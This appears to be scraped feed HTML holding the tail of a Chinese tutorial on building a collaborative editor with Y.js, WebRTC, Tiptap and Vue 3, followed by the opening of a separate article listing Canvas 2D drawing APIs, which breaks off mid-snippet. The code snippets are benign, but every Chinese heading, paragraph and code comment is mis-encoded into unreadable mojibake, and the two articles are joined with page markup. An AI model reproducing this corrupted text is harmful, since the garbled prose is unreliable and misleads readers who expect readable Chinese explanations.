<span class="hljs-number">3</span>. ç”¨æˆ·<span class="hljs-selector-tag">A</span>è¾“å…¥æ–‡å­—"Hello"
   â”œâ”€ Tiptapç”ŸæˆProseMirroräº‹åŠ¡
   â”œâ”€ Collaborationæ‰©å±•è½¬æ¢ä¸ºY<span class="hljs-selector-class">.js</span>æ“ä½œ
   â”œâ”€ Y<span class="hljs-selector-class">.js</span>æ“ä½œé€šè¿‡WebRTCå‘é€ç»™ç”¨æˆ·<span class="hljs-selector-tag">B</span>
   â””â”€ ç”¨æˆ·<span class="hljs-selector-tag">B</span>çš„Y<span class="hljs-selector-class">.js</span>åº”ç”¨æ“ä½œï¼Œæ›´æ–°Tiptap

<span class="hljs-number">4</span>. ç”¨æˆ·<span class="hljs-selector-tag">B</span>åŒæ—¶è¾“å…¥"World"
   â”œâ”€ åŒæ ·æµç¨‹åå‘è¿›è¡Œ
   â”œâ”€ Y<span class="hljs-selector-class">.js</span>çš„CRDTç¡®ä¿é¡ºåºä¸€è‡´æ€§
   â””â”€ æœ€ç»ˆåŒæ–¹éƒ½çœ‹åˆ°"HelloWorld"
</code></pre>
<h2 data-id="heading-13">è§†è§‰åé¦ˆçš„å®ç°</h2>
<p>ä¸ºäº†è®©ç”¨æˆ·æ„ŸçŸ¥åˆ°å…¶ä»–åä½œè€…çš„å­˜åœ¨ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* å…¶ä»–ç”¨æˆ·çš„å…‰æ ‡æ ·å¼ */</span>
<span class="hljs-selector-class">.ProseMirror-y-cursor</span> {
  <span class="hljs-attribute">border-left</span>: <span class="hljs-number">2px</span> solid; <span class="hljs-comment">/* ä½¿ç”¨ç”¨æˆ·é¢œè‰² */</span>
}

<span class="hljs-selector-class">.ProseMirror-y-cursor</span> &gt; <span class="hljs-selector-tag">div</span> {
  <span class="hljs-comment">/* æ˜¾ç¤ºç”¨æˆ·åçš„æ ‡ç­¾ */</span>
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--user-color);
  <span class="hljs-attribute">color</span>: white;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">2px</span> <span class="hljs-number">6px</span>;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">3px</span>;
}
</code></pre>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨æˆ·çŠ¶æ€æ˜¾ç¤º</span>
&lt;div v-<span class="hljs-keyword">for</span>=<span class="hljs-string">"user in onlineUsers"</span> :key=<span class="hljs-string">"user.clientId"</span> 
     <span class="hljs-keyword">class</span>=<span class="hljs-string">"user-tag"</span>
     :style=<span class="hljs-string">"{
       backgroundColor: user.color + '20',
       borderColor: user.color,
       color: user.color
     }"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-avatar"</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">"{ backgroundColor: user.color }"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
  {{ user.<span class="hljs-property">name</span> }}
&lt;/div&gt;
</code></pre>
<h2 data-id="heading-14">æ€§èƒ½ä¼˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h2>
<h3 data-id="heading-15">1. å»¶è¿Ÿä¼˜åŒ–</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ‰¹é‡æ›´æ–°ï¼Œå‡å°‘ç½‘ç»œä¼ è¾“</span>
provider.<span class="hljs-property">value</span>.<span class="hljs-property">awareness</span>.<span class="hljs-title function_">setLocalState</span>({
  <span class="hljs-attr">user</span>: userInfo.<span class="hljs-property">value</span>,
  <span class="hljs-attr">cursor</span>: editor.<span class="hljs-property">value</span>.<span class="hljs-property">state</span>.<span class="hljs-property">selection</span>.<span class="hljs-property">from</span>,
  <span class="hljs-comment">// å…¶ä»–çŠ¶æ€...</span>
})

<span class="hljs-comment">// èŠ‚æµé¢‘ç¹æ›´æ–°</span>
<span class="hljs-keyword">let</span> updateTimeout
<span class="hljs-keyword">const</span> <span class="hljs-title function_">throttledUpdate</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-built_in">clearTimeout</span>(updateTimeout)
  updateTimeout = <span class="hljs-built_in">setTimeout</span>(updateOnlineUsers, <span class="hljs-number">100</span>)
}
</code></pre>
<h3 data-id="heading-16">2. é”™è¯¯å¤„ç†ä¸é™çº§</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">try</span> {
  <span class="hljs-comment">// å°è¯•WebRTCè¿æ¥</span>
  provider.<span class="hljs-property">value</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId.<span class="hljs-property">value</span>, ydoc.<span class="hljs-property">value</span>, config)
} <span class="hljs-keyword">catch</span> (error) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'WebRTCè¿æ¥å¤±è´¥ï¼Œé™çº§åˆ°æ¨¡æ‹Ÿæ¨¡å¼:'</span>, error)
  
  <span class="hljs-comment">// é™çº§ç­–ç•¥ï¼šæ¨¡æ‹ŸååŒï¼Œå®é™…ä¸ºå•æœº</span>
  isConnected.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  onlineUsers.<span class="hljs-property">value</span> = [{
    <span class="hljs-attr">clientId</span>: <span class="hljs-number">1</span>,
    ...userInfo.<span class="hljs-property">value</span>,
    <span class="hljs-attr">isCurrentUser</span>: <span class="hljs-literal">true</span>
  }]
  
  <span class="hljs-comment">// æç¤ºç”¨æˆ·</span>
  <span class="hljs-title function_">showToast</span>(<span class="hljs-string">'ååŒæ¨¡å¼ä¸å¯ç”¨ï¼Œå·²åˆ‡æ¢åˆ°å•æœºæ¨¡å¼'</span>)
}
</code></pre>
<h3 data-id="heading-17">3. å†…å­˜ç®¡ç†</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç»„ä»¶å¸è½½æ—¶æ¸…ç†</span>
<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (editor.<span class="hljs-property">value</span>) editor.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
  <span class="hljs-keyword">if</span> (provider.<span class="hljs-property">value</span>) {
    provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">disconnect</span>()
    provider.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
  }
  <span class="hljs-keyword">if</span> (ydoc.<span class="hljs-property">value</span>) ydoc.<span class="hljs-property">value</span>.<span class="hljs-title function_">destroy</span>()
})
</code></pre>
<h2 data-id="heading-18">æœ€ç»ˆæ•ˆæœ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f7bc7d1cb45a4a34ab1b6b5e005bb34c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac56qB5Zu0Tk8x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938951&amp;x-signature=ABgIl6Mc%2FywPtKBNX98bVea3pW0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/>
ä¸¤ä¸ªç”¨æˆ·åŒæ—¶ç¼–è¾‘ï¼Œå„åœ¨äº’ä¸å½±å“
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7642c63b8390406f90e95df0116ee41e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56CB5Yac56qB5Zu0Tk8x:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765938951&amp;x-signature=ENSn2AT1xxvU5mzsvjhULqUPAmg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<h2 data-id="heading-19">éƒ¨ç½²ä¸æ‰©å±•</h2>
<h3 data-id="heading-20">1. ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”Ÿäº§ç¯å¢ƒä¿¡ä»¤æœåŠ¡å™¨é…ç½®</span>
<span class="hljs-keyword">const</span> provider = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebrtcProvider</span>(roomId, ydoc, {
  <span class="hljs-attr">signaling</span>: [
    <span class="hljs-string">'wss://signaling1.yourdomain.com'</span>,
    <span class="hljs-string">'wss://signaling2.yourdomain.com'</span> <span class="hljs-comment">// å¤šèŠ‚ç‚¹å†—ä½™</span>
  ],
  <span class="hljs-attr">password</span>: <span class="hljs-string">'secure-room-password'</span>, <span class="hljs-comment">// æˆ¿é—´å¯†ç ä¿æŠ¤</span>
  <span class="hljs-attr">maxConns</span>: <span class="hljs-number">20</span>, <span class="hljs-comment">// é™åˆ¶æœ€å¤§è¿æ¥æ•°</span>
})
</code></pre>
<h3 data-id="heading-21">2. æ‰©å±•åŠŸèƒ½</h3>
<ul>
<li><strong>ç¦»çº¿æ”¯æŒ</strong>ï¼šä½¿ç”¨ IndexedDB å­˜å‚¨æœ¬åœ°å‰¯æœ¬</li>
<li><strong>ç‰ˆæœ¬å†å²</strong>ï¼šåˆ©ç”¨ Y.js çš„å¿«ç…§åŠŸèƒ½</li>
<li><strong>æƒé™æ§åˆ¶</strong>ï¼šä¸åŒç”¨æˆ·çš„ä¸åŒç¼–è¾‘æƒé™</li>
<li><strong>æ’ä»¶ç³»ç»Ÿ</strong>ï¼šæ‰©å±•ç¼–è¾‘å™¨åŠŸèƒ½</li>
</ul>
<h2 data-id="heading-22">æ€»ç»“</h2>
<p>æ„å»ºå®æ—¶ååŒç¼–è¾‘å™¨æ˜¯ä¸€ä¸ªå¤æ‚çš„ç³»ç»Ÿå·¥ç¨‹ï¼Œæ¶‰åŠå¤šä¸ªæŠ€æœ¯æ ˆï¼š</p>
<ol>
<li><strong>Y.js</strong> æä¾›äº†ç†è®ºåŸºç¡€ï¼ˆCRDTç®—æ³•ï¼‰å’Œæ ¸å¿ƒåŒæ­¥èƒ½åŠ›</li>
<li><strong>WebRTC</strong> å®ç°äº†é«˜æ•ˆçš„P2Pæ•°æ®ä¼ è¾“</li>
<li><strong>Tiptap</strong> æä¾›äº†ä¼˜ç§€çš„ç¼–è¾‘å™¨ä½“éªŒå’Œæ‰©å±•æ€§</li>
<li><strong>Vue 3</strong> æ„å»ºäº†å“åº”å¼çš„ç”¨æˆ·ç•Œé¢</li>
</ol>
<p>è¿™ä¸ªé¡¹ç›®çš„å…³é”®æˆåŠŸå› ç´ åœ¨äºå„ä¸ªç»„ä»¶ä¹‹é—´çš„æ— ç¼é›†æˆã€‚Y.jså¤„ç†æ•°æ®ä¸€è‡´æ€§ï¼ŒWebRTCå¤„ç†ç½‘ç»œé€šä¿¡ï¼ŒTiptapå¤„ç†ç”¨æˆ·äº¤äº’ï¼Œè€ŒVueå°†å®ƒä»¬æœ‰æœºåœ°ç»„åˆåœ¨ä¸€èµ·ã€‚</p>
<blockquote>
<p>å®Œæ•´ä»£ç è”ç³»ä½œè€…è·å–ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[canvasçš„ç ”ç©¶]]></title>    <link>https://juejin.cn/post/7581738974425006099</link>    <guid>https://juejin.cn/post/7581738974425006099</guid>    <pubDate>2025-12-10T02:45:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581738974425006099" data-draft-id="7581751726505115691" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="canvasçš„ç ”ç©¶"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T02:45:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€é¥æ±Ÿæ¹–"/> <meta itemprop="url" content="https://juejin.cn/user/3940246036941134"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            canvasçš„ç ”ç©¶
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3940246036941134/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€é¥æ±Ÿæ¹–
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:45:42.000Z" title="Wed Dec 10 2025 02:45:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€Canvas ä¸Šä¸‹æ–‡è·å–ä¸åŸºç¡€</h2>
<h3 data-id="heading-1">1. è·å–ç»˜å›¾ä¸Šä¸‹æ–‡</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">canvas</span> = document.getElementById(<span class="hljs-string">'myCanvas'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">ctx</span> = canvas.getContext(<span class="hljs-string">'2d'</span>)<span class="hljs-comment">;  // è·å–2Dä¸Šä¸‹æ–‡</span>
// const <span class="hljs-attr">ctx3d</span> = canvas.getContext(<span class="hljs-string">'webgl'</span>)<span class="hljs-comment">;  // è·å–3Dä¸Šä¸‹æ–‡(WebGL)</span>
</code></pre>
<h3 data-id="heading-2">2. Canvas å…ƒç´ å±æ€§</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino">canvas.width = <span class="hljs-number">800</span>;      <span class="hljs-comment">// è®¾ç½®Canvaså®½åº¦ï¼ˆåƒç´ ï¼‰</span>
canvas.height = <span class="hljs-number">600</span>;     <span class="hljs-comment">// è®¾ç½®Canvasé«˜åº¦ï¼ˆåƒç´ ï¼‰</span>
<span class="hljs-type">const</span> width = canvas.width;   <span class="hljs-comment">// è¯»å–å®½åº¦</span>
<span class="hljs-type">const</span> height = canvas.height; <span class="hljs-comment">// è¯»å–é«˜åº¦</span>
</code></pre>
<h2 data-id="heading-3">ğŸ¨ äºŒã€åŸºæœ¬å›¾å½¢ç»˜åˆ¶API</h2>
<h3 data-id="heading-4">1. çŸ©å½¢ç»˜åˆ¶</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å¡«å……çŸ©å½¢</span>
ctx.<span class="hljs-built_in">fillRect</span>(x, y, width, height);

<span class="hljs-comment">// æè¾¹çŸ©å½¢</span>
ctx.<span class="hljs-built_in">strokeRect</span>(x, y, width, height);

<span class="hljs-comment">// æ¸…é™¤çŸ©å½¢åŒºåŸŸ</span>
ctx.<span class="hljs-built_in">clearRect</span>(x, y, width, height);
</code></pre>
<h3 data-id="heading-5">2. è·¯å¾„ç»˜åˆ¶</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// å¼€å§‹æ–°è·¯å¾„</span>
ctx<span class="hljs-selector-class">.beginPath</span>();

<span class="hljs-comment">// ç§»åŠ¨ç¬”è§¦</span>
ctx<span class="hljs-selector-class">.moveTo</span>(x, y);

<span class="hljs-comment">// ç»˜åˆ¶ç›´çº¿</span>
ctx<span class="hljs-selector-class">.lineTo</span>(x, y);

<span class="hljs-comment">// ç»˜åˆ¶åœ†å¼§</span>
ctx<span class="hljs-selector-class">.arc</span>(x, y, radius, startAngle, endAngle, anticlockwise);
<span class="hljs-comment">// anticlockwise: trueé€†æ—¶é’ˆï¼Œfalseé¡ºæ—¶é’ˆ</span>

<span class="hljs-comment">// ç»˜åˆ¶åœ†å¼§ï¼ˆé€šè¿‡æ§åˆ¶ç‚¹ï¼‰</span>
ctx<span class="hljs-selector-class">.arcTo</span>(x1, y1, x2, y2, radius);

<span class="hljs-comment">// ç»˜åˆ¶äºŒæ¬¡è´å¡å°”æ›²çº¿</span>
ctx<span class="hljs-selector-class">.quadraticCurveTo</span>(cp1x, cp1y, x, y);

<span class="hljs-comment">// ç»˜åˆ¶ä¸‰æ¬¡è´å¡å°”æ›²çº¿</span>
ctx<span class="hljs-selector-class">.bezierCurveTo</span>(cp1x, cp1y, cp2x, cp2y, x, y);

<span class="hljs-comment">// ç»˜åˆ¶çŸ©å½¢è·¯å¾„</span>
ctx<span class="hljs-selector-class">.rect</span>(x, y, width, height);

<span class="hljs-comment">// é—­åˆè·¯å¾„</span>
ctx<span class="hljs-selector-class">.closePath</span>();

<span class="hljs-comment">// å¡«å……è·¯å¾„</span>
ctx<span class="hljs-selector-class">.fill</span>();

<span class="hljs-comment">// æè¾¹è·¯å¾„</span>
ctx<span class="hljs-selector-class">.stroke</span>();

<span class="hljs-comment">// åˆ¤æ–­ç‚¹æ˜¯å¦åœ¨è·¯å¾„å†…</span>
const isInPath = ctx<span class="hljs-selector-class">.isPointInPath</span>(x, y);
</code></pre>
<h3 data-id="heading-6">3. å¤æ‚è·¯å¾„</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ¤­åœ†</span>
ctx.<span class="hljs-built_in">ellipse</span>(x, y, radiusX, radiusY, rotation, startAngle, endAngle, anticlockwise);

<span class="hljs-comment">// åœ†è§’çŸ©å½¢ï¼ˆéœ€è¦è‡ªå®šä¹‰å‡½æ•°æˆ–è¾ƒæ–°æµè§ˆå™¨ï¼‰</span>
ctx.<span class="hljs-built_in">roundRect</span>(x, y, width, height, [radius]);
</code></pre>
<h2 data-id="heading-7">Â ä¸‰ã€æ ·å¼ä¸é¢œè‰²API</h2>
<h3 data-id="heading-8">1. å¡«å……ä¸æè¾¹æ ·å¼</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// å¡«å……é¢œè‰²
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'color'</span><span class="hljs-comment">;  // é¢œè‰²å€¼ã€æ¸å˜æˆ–å›¾æ¡ˆ</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'#FF0000'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'rgba(255, 0, 0, 0.5)'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = <span class="hljs-string">'red'</span><span class="hljs-comment">;</span>

// æè¾¹é¢œè‰²
<span class="hljs-attr">ctx.strokeStyle</span> = <span class="hljs-string">'color'</span><span class="hljs-comment">;</span>

// é€æ˜åº¦ï¼ˆå…¨å±€ï¼‰
<span class="hljs-attr">ctx.globalAlpha</span> = <span class="hljs-number">0.5</span><span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-9">2. æ¸å˜</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">// çº¿æ€§æ¸å˜
const <span class="hljs-attr">linearGrad</span> = ctx.createLinearGradient(x1, y1, x2, y2)<span class="hljs-comment">;</span>
linearGrad.addColorStop(0, 'red')<span class="hljs-comment">;</span>
linearGrad.addColorStop(1, 'blue')<span class="hljs-comment">;</span>
<span class="hljs-attr">ctx.fillStyle</span> = linearGrad<span class="hljs-comment">;</span>

// å¾„å‘æ¸å˜
const <span class="hljs-attr">radialGrad</span> = ctx.createRadialGradient(x1, y1, r1, x2, y2, r2)<span class="hljs-comment">;</span>
radialGrad.addColorStop(0, 'white')<span class="hljs-comment">;</span>
radialGrad.addColorStop(1, 'black')<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-10">3. å›¾æ¡ˆ</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">img</span> = new Image()<span class="hljs-comment">;</span>
<span class="hljs-attr">img.src</span> = <span class="hljs-string">'pattern.png'</span><span class="hljs-comment">;</span>
<span class="hljs-attr">img.onload</span> = function() {
    const <span class="hljs-attr">pattern</span> = ctx.createPattern(img, <span class="hljs-string">'repeat'</span>)<span class="hljs-comment">;</span>
    <span class="hljs-attr">ctx.fillStyle</span> = pattern<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>
// repeatæ¨¡å¼: 'repeat', 'repeat-x', 'repeat-y', 'no-repeat'
</code></pre>
<h3 data-id="heading-11">4. çº¿æ¡æ ·å¼</h3>
<p>javascript</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">ctx.lineWidth</span> = <span class="hljs-number">5</span><span class="hljs-comment">;           // çº¿æ¡å®½åº¦ï¼ˆåƒç´ ï¼‰</span>
<span class="hljs-attr">ctx.lineCap</span> = <span class="hljs-string">'butt'</span><span class="hljs-comment">;        // ç«¯ç‚¹æ ·å¼: 'butt', 'round', 'square'</span>
<span class="hljs-attr">ctx.lineJoin</span> = <span class="hljs-string">'miter'</span><span class="hljs-comment">;      // äº¤ç‚¹æ ·å¼: 'miter', 'round', 'bevel'</span>
<span class="hljs-attr">ctx.miterLimit</span> = <span class="hljs-number">10</span><span class="hljs-comment">;         // æ–œæ¥é™åˆ¶</span>
ctx.setLineDash(<span class="hljs-section">[5, 15]</span>)<span class="hljs-comment">;    // è®¾ç½®è™šçº¿æ ·å¼</span>
ctx.getLineDash()<span class="hljs-comment">;           // è·å–è™šçº¿æ ·å¼</span>
<span class="hljs-attr">ctx.lineDashOffset</span> = <span class="hljs-number">5</span><span class="hljs-comment">;      // è™šçº¿åç§»é‡</span>
</code></pre>
<h2 data-id="heading-12">å››ã€æ–‡æœ¬ç»˜åˆ¶API</h2>
<h3 data-id="heading-13">1. æ–‡æœ¬ç»˜åˆ¶</h3>
<p>javascript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å¡«å……æ–‡æœ¬</span>
ctx.<span class="hljs-built_in">fillText</span>(text, x, y [, maxWidth]);

<span class="hljs-comment">// æè¾¹æ–‡æœ¬</span>
ctx.<span class="hljs-built_in">strokeText</span>(text, x, y [, maxWidth]);

<span class="hljs-comment">// æµ‹é‡æ–‡æœ¬</span>
<span class="hljs-type">const</span> metrics = ctx.<span class="hljs-built_in">measureText</span>(text);
metrics.width;      <span class="hljs-comment">// æ–‡æœ¬å®½åº¦</span>
metrics.actualBoundingBoxLeft;   <span class="hljs-comment">// å·¦è¾¹ç•Œè·ç¦»</span>
metrics.actualBoundingBoxRight;  <span class="hljs-comment">// å³è¾¹ç•Œè·ç¦»</span>
</code></pre>
<h3 data-id="heading-14">2. æ–‡æœ¬æ ·å¼</h3>
<p>javascript</p>
<pre><code class="hljs language-perl" lang="perl">ctx.font = <span class="hljs-string">'italic bold 20px Arial'</span>;  <span class="hljs-regexp">//</span> å­—ä½“æ ·å¼
ctx.textAlign = <span class="hljs-string">'center'</span>;     <span class="hljs-regexp">//</span> å¯¹é½: <span class="hljs-string">'left'</span>, <span class="hljs-string">'center'</span>, <span class="hljs-string">'right'</span>, <span class="hljs-string">'start'</span>, <span class="hljs-string">'end'</span>
ctx.textBaseline = <span class="hljs-string">'middle'</span>;  <span class="hljs-regexp">//</span> åŸºçº¿: <span class="hljs-string">'top'</span>, <span class="hljs-string">'hanging'</span>, <span class="hljs-string">'middle'</span>, <span class="hljs-string">'alphabetic'</span>, <span class="hljs-string">'ideographic'</span>, <span class="hljs-string">'bottom'</span>
ctx.direction = <span class="hljs-string">'ltr'</span>;        <span class="hljs-regexp">//</span> æ–¹å‘: <span class="hljs-string">'ltr'</span>, <span class="hljs-string">'rtl'</span>, <span class="hljs-string">'inherit'</span>
</code></pre>
<h2 data-id="heading-15">äº”ã€å›¾åƒæ“ä½œAPI</h2>
<h3 data-id="heading-16">1. ç»˜åˆ¶å›¾åƒ</h3>
<p>javascript</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-tag">img</span> = new <span class="hljs-built_in">Image</span>();
